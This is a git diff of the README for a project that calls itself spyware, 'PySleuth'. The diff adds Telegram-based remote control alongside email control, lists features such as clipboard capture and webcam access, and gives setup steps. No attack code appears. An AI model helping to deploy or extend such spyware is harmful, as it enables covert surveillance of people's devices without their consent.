@@ -1,6 +1,6 @@
 # PySleuth
 
-PySleuth is an advanced spyware controllable by email.
+PySleuth is an advanced spyware controllable by email/telegram.
 
 ## Features
 
@@ -17,8 +17,6 @@ PySleuth is an advanced spyware controllable by email.
 - Clipboard data
 
 - Webcam access
-
-- Control via other applications
 
 ## Requirements
 
@@ -37,6 +35,29 @@ Coming soon !
 
 ## Usage
 
+### Telegram Control
+
+- Clone repository
+
+- Make telegram bot using telegram's Bot Father
+
+- Configure environment variables
+
+```bash
+export TELEGRAM_TOKEN="your token here"
+export TELEGRAM_ID="administrator's chat ID here"
+```
+
+- Edit [settings.yml](settings.yml) according to preference
+
+- Run
+
+```bash
+python main.py
+```
+
+### Email control
+
 - Clone repository
 
 - Make an email for the program and setup password for the application
@@ -49,16 +70,16 @@ Coming soon !
 
   - Select app as `Mail` and choose your device and click on `GENERATE`. Note down the password provided
 
-- Save password of email in env variable
+- Configure environment variables
 
 ```bash
 export PYSLEUTH_EMAIL_PWD="your password here"
 ```
 
-- Edit [settings.cfg](settings.cfg) according to preference
+- Edit [settings.yml](settings.yml) according to preference
 
 - Run
 
 ```bash
-python pysleuth
+python main.py
 ```
